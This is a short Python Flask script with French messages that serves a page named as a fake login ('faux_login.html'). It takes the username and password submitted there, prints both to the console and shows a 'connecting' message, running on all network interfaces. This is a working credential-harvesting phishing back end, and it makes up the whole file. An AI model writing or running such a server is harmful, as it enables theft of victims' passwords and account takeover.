from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return render_template("faux_login.html")

@app.route('/faux_login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    print(f"[+] Nom d'utilisateur reçu : {username}")
    print(f"[+] Mot de passe reçu : {password}")

    return "<h1>Connexion en cours...</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
